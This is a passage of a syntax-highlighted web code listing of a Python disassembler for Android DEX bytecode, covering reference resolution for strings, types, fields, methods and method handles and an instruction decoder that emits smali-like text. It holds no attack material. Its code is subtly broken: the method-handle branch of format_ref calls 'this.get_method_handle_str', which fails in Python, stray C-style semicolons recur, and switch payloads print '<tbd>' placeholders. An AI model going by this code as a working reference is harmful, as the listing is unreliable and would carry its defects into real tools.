class="line">                    code2 = ((b0n &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">12</span>) | ((b1n &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">6</span>) | (b2n &amp; <span class="number">0x3F</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0xDC00</span> &lt;= code2 &lt;= <span class="number">0xDFFF</span>:</span><br><span class="line">                        cp = <span class="number">0x10000</span> + (((code - <span class="number">0xD800</span>) &lt;&lt; <span class="number">10</span>) | (code2 - <span class="number">0xDC00</span>))</span><br><span class="line">                        chars.append(<span class="built_in">chr</span>(cp))</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        chars.append(<span class="built_in">chr</span>(code))</span><br><span class="line">                        chars.append(<span class="built_in">chr</span>(code2))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    chars.append(<span class="built_in">chr</span>(code))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(chars), pos</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>.string_ids_size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> idx <span class="keyword">in</span> <span class="variable language_">self</span>._string_cache:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>._string_cache[idx]</span><br><span class="line">        off = <span class="variable language_">self</span>._string_offs[idx]</span><br><span class="line">        <span class="keyword">if</span> off &lt;= <span class="number">0</span> <span class="keyword">or</span> off &gt;= <span class="variable language_">self</span>.size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        s, _ = <span class="variable language_">self</span>._read_mutf8_at(off)</span><br><span class="line">        <span class="variable language_">self</span>._string_cache[idx] = s</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_type_desc</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>.type_ids_size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        sidx = <span class="variable language_">self</span>._type_str_idx[idx]</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.get_string(sidx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_type_list</span>(<span class="params">self, off: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> off == <span class="number">0</span> <span class="keyword">or</span> off &gt;= <span class="variable language_">self</span>.size:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        size = <span class="variable language_">self</span>._u4(off)</span><br><span class="line">        types: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">        p = off + <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">            t_idx = <span class="variable language_">self</span>._u2(p)</span><br><span class="line">            p += <span class="number">2</span></span><br><span class="line">            desc = <span class="variable language_">self</span>.get_type_desc(t_idx)</span><br><span class="line">            types.append(desc <span class="keyword">if</span> desc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;type@<span class="subst">&#123;hex16(t_idx)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> types</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_proto_sig</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>.proto_ids_size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        shorty_idx, ret_type_idx, params_off = <span class="variable language_">self</span>._proto_list[idx]</span><br><span class="line">        ret = <span class="variable language_">self</span>.get_type_desc(ret_type_idx) <span class="keyword">or</span> <span class="string">&quot;V&quot;</span></span><br><span class="line">        params = <span class="variable language_">self</span>._get_type_list(params_off)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;(<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(params)&#125;</span>)<span class="subst">&#123;ret&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_field_str</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>.field_ids_size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        class_idx, type_idx, name_idx = <span class="variable language_">self</span>._field_list[idx]</span><br><span class="line">        owner = <span class="variable language_">self</span>.get_type_desc(class_idx) <span class="keyword">or</span> <span class="string">f&quot;type@<span class="subst">&#123;hex16(class_idx)&#125;</span>&quot;</span></span><br><span class="line">        ftype = <span class="variable language_">self</span>.get_type_desc(type_idx) <span class="keyword">or</span> <span class="string">f&quot;type@<span class="subst">&#123;hex16(type_idx)&#125;</span>&quot;</span></span><br><span class="line">        name = <span class="variable language_">self</span>.get_string(name_idx) <span class="keyword">or</span> <span class="string">f&quot;string@<span class="subst">&#123;hex32(name_idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;owner&#125;</span>-&gt;<span class="subst">&#123;name&#125;</span>:<span class="subst">&#123;ftype&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_method_str</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>.method_ids_size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        class_idx, proto_idx, name_idx = <span class="variable language_">self</span>._method_list[idx]</span><br><span class="line">        owner = <span class="variable language_">self</span>.get_type_desc(class_idx) <span class="keyword">or</span> <span class="string">f&quot;type@<span class="subst">&#123;hex16(class_idx)&#125;</span>&quot;</span></span><br><span class="line">        name = <span class="variable language_">self</span>.get_string(name_idx) <span class="keyword">or</span> <span class="string">f&quot;string@<span class="subst">&#123;hex32(name_idx)&#125;</span>&quot;</span></span><br><span class="line">        sig = <span class="variable language_">self</span>.get_proto_sig(proto_idx) <span class="keyword">or</span> <span class="string">f&quot;proto@<span class="subst">&#123;hex16(proto_idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;owner&#125;</span>-&gt;<span class="subst">&#123;name&#125;</span><span class="subst">&#123;sig&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_call_site_str</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>._cs_off == <span class="number">0</span> <span class="keyword">or</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>._cs_count:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        entry_off = <span class="variable language_">self</span>._u4(<span class="variable language_">self</span>._cs_off + idx * <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;call_site@<span class="subst">&#123;hex32(entry_off)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_method_handle_str</span>(<span class="params">self, idx: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>._mh_off == <span class="number">0</span> <span class="keyword">or</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="variable language_">self</span>._mh_count:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        off = <span class="variable language_">self</span>._mh_off + idx * <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span> off + <span class="number">8</span> &gt; <span class="variable language_">self</span>.size:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        mh_type = <span class="variable language_">self</span>._u2(off + <span class="number">0</span>)</span><br><span class="line">        _unused = <span class="variable language_">self</span>._u2(off + <span class="number">2</span>)</span><br><span class="line">        target_id = <span class="variable language_">self</span>._u2(off + <span class="number">4</span>)</span><br><span class="line">        _unused2 = <span class="variable language_">self</span>._u2(off + <span class="number">6</span>)</span><br><span class="line">        target_field = <span class="variable language_">self</span>.get_field_str(target_id)</span><br><span class="line">        target_method = <span class="variable language_">self</span>.get_method_str(target_id)</span><br><span class="line">        target = target_method <span class="keyword">if</span> target_method <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> target_field</span><br><span class="line">        <span class="keyword">if</span> target <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            target = <span class="string">f&quot;id@<span class="subst">&#123;hex16(target_id)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;method_handle[kind=<span class="subst">&#123;mh_type&#125;</span>] <span class="subst">&#123;target&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">format_ref</span>(<span class="params">self, kind: <span class="type">Optional</span>[<span class="built_in">int</span>], idx: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> kind <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;ref@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">0</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_string(idx)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;\&quot;<span class="subst">&#123;s&#125;</span>\&quot;&quot;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;string@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">1</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_type_desc(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;type@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">2</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_field_str(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;field@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">3</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_method_str(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;method@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">4</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_proto_sig(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;proto@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">5</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_call_site_str(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;call_site@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">6</span>:</span><br><span class="line">            s = this.get_method_handle_str(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;method_handle@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;ref_kind_name(kind)&#125;</span>@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_block</span>(<span class="params">insns_bytes: <span class="built_in">bytes</span>, regs_size: <span class="built_in">int</span>, ins_size: <span class="built_in">int</span>, dex: <span class="type">Optional</span>[DexFile] = <span class="literal">None</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    insns_size = <span class="built_in">len</span>(insns_bytes) // <span class="number">2</span></span><br><span class="line">    units = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;&#x27;</span> + <span class="string">&#x27;H&#x27;</span> * insns_size, insns_bytes))</span><br><span class="line">    labels_needed: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">str</span>] = &#123;&#125;</span><br><span class="line">    payload_labels: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">str</span>] = &#123;&#125;</span><br><span class="line">    switch_bases: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">int</span>] = &#123;&#125;</span><br><span class="line">    decoded: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="type">List</span>[<span class="built_in">str</span>]]] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rn</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> reg_name(x, regs_size, ins_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fmt_ref</span>(<span class="params">kind: <span class="type">Optional</span>[<span class="built_in">int</span>], idx: <span class="built_in">int</span>, is_32: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> dex <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            base = hex32(idx) <span class="keyword">if</span> is_32 <span class="keyword">else</span> hex16(idx)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;ref_kind_name(kind)&#125;</span>@<span class="subst">&#123;base&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> dex.format_ref(kind, idx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_one</span>(<span class="params">pc: <span class="built_in">int</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        u0 = units[pc]</span><br><span class="line">        op_lo = u0 &amp; <span class="number">0xFF</span></span><br><span class="line">        op_hi = (u0 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> u0 <span class="keyword">in</span> (<span class="number">0x0100</span>, <span class="number">0x0200</span>, <span class="number">0x0300</span>):</span><br><span class="line">            <span class="keyword">if</span> u0 == <span class="number">0x0100</span>:</span><br><span class="line">                <span class="keyword">if</span> pc + <span class="number">4</span> &gt; insns_size: <span class="keyword">return</span> (<span class="number">1</span>, [<span class="string">&quot;# truncated packed-switch-payload&quot;</span>])</span><br><span class="line">                size = units[pc + <span class="number">1</span>]</span><br><span class="line">                lines = [<span class="string">&quot;.packed-switch 0x%08x&quot;</span> % ((units[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) | units[pc + <span class="number">2</span>])]</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                    lines.append(<span class="string">&quot;    &lt;tbd&gt;&quot;</span>)</span><br><span class="line">                lines.append(<span class="string">&quot;.end packed-switch&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> (<span class="number">4</span> + size * <span class="number">2</span>, lines)</span><br><span class="line">            <span class="keyword">if</span> u0 == <span class="number">0x0200</span>:</span><br><span class="line">                <span class="keyword">if</span> pc + <span class="number">2</span> &gt; insns_size: <span class="keyword">return</span> (<span class="number">1</span>, [<span class="string">&quot;# truncated sparse-switch-payload&quot;</span>])</span><br><span class="line">                size = units[pc + <span class="number">1</span>]</span><br><span class="line">                lines = [<span class="string">&quot;.sparse-switch&quot;</span>]</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                    lines.append(<span class="string">&quot;    &lt;tbd&gt; -&gt; &lt;tbd&gt;&quot;</span>)</span><br><span class="line">                lines.append(<span class="string">&quot;.end sparse-switch&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> (<span class="number">2</span> + size * <span class="number">4</span>, lines)</span><br><span class="line">            <span class="keyword">if</span> u0 == <span class="number">0x0300</span>:</span><br><span class="line">                <span class="keyword">if</span> pc + <span class="number">4</span> &gt; insns_size: <span class="keyword">return</span> (<span class="number">1</span>, [<span class="string">&quot;# truncated array-payload&quot;</span>])</span><br><span class="line">                elem_width = units[pc + <span class="number">1</span>]</span><br><span class="line">                size = (units[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) | units[pc + <span class="number">2</span>]</span><br><span class="line">                total_bytes = elem_width * size</span><br><span class="line">                cu = (total_bytes + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">                pad = cu &amp; <span class="number">1</span></span><br><span class="line">                lines = [<span class="string">f&quot;.array-data <span class="subst">&#123;elem_width&#125;</span>&quot;</span>, <span class="string">&quot;.end array-data&quot;</span>]</span><br><span class="line">                <span class="keyword">return</span> (<span class="number">4</span> + cu + pad, lines)</span><br><span class="line"></span><br><span class="line">        info = OPCODES.get(op_lo)</span><br><span class="line">        <span class="keyword">if</span> info <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span>, [<span class="string">f&quot;# unknown-op <span class="subst">&#123;hex8(op_lo)&#125;</span>&quot;</span>])</span><br><span class="line"></span><br><span class="line">        name, fmt, ref1, ref2 = info</span><br><span class="line">        a8 = op_hi</span><br><span class="line">        out: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">        size = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> fmt == <span class="string">&quot;10x&quot;</span>:</span><br><span class="line">            out.append(name)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;11x&quot;</span>:</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(a8)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;11n&quot;</span>:</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            B = s1_to_s8(a8 &amp; <span class="number">0xF</span>, <span class="number">4</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;B&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;12x&quot;</span>:</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            B = a8 &amp; <span class="number">0xF</span></span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;10t&quot;</span>:</span><br><span class="line">            off8 = s1_to_s8(a8, <span class="number">8</span>);</span><br><span class="line">            tgt = pc + off8</span><br><span class="line">            labels_needed.setdefault(tgt, <span class="string">f&quot;:L<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;labels_needed[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;20t&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            off16 = s16(units[pc + <span class="number">1</span>]);</span><br><span class="line">            tgt = pc + off16</span><br><span class="line">            labels_needed.setdefault(tgt, <span class="string">f&quot;:L<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;labels_needed[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;30t&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            off32 = s32_from_u2(units[pc + <span class="number">1</span>], units[pc + <span class="number">2</span>]);</span><br><span class="line">            tgt = pc + off32</span><br><span class="line">            labels_needed.setdefault(tgt, <span class="string">f&quot;:L<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;labels_needed[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;21t&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            off16 = s16(units[pc + <span class="number">1</span>]);</span><br><span class="line">            tgt = pc + off16</span><br><span class="line">            labels_needed.setdefault(tgt, <span class="string">f&quot;:L<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;labels_needed[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;22t&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            B = a8 &amp; <span class="number">0xF</span>;</span><br><span class="line">            off16 = s16(units[pc + <span class="number">1</span>]);</span><br><span class="line">            tgt = pc + off16</span><br><span class="line">            labels_needed.setdefault(tgt, <span class="string">f&quot;:L<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>, <span class="subst">&#123;labels_needed[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;21s&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            lit = s16(units[pc + <span class="number">1</span>])</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;lit&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;21ih&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            val = units[pc + <span class="number">1</span>] &lt;&lt; <span class="number">16</span></span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;21lh&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            val = units[pc + <span class="number">1</span>] &lt;&lt; <span class="number">48</span></span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;31i&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            lit = s32_from_u2(units[pc + <span class="number">1</span>], units[pc + <span class="number">2</span>])</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;hex32(lit)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;51l&quot;</span>:</span><br><span class="line">            size = <span class="number">5</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            lit = s64_from_u2(units[pc + <span class="number">1</span>], units[pc + <span class="number">2</span>], units[pc + <span class="number">3</span>], units[pc + <span class="number">4</span>])</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(lit &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;21c&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            idx = units[pc + <span class="number">1</span>]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;fmt_ref(ref1, idx, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;31c&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            idx = (units[pc + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | units[pc + <span class="number">1</span>]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;fmt_ref(ref1, idx, <span class="literal">True</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;22c&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            B = a8 &amp; <span class="number">0xF</span>;</span><br><span class="line">            idx = units[pc + <span class="number">1</span>]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>, <span class="subst">&#123;fmt_ref(ref1, idx, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;22x&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            BBBB = units[pc + <span class="number">1</span>]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span 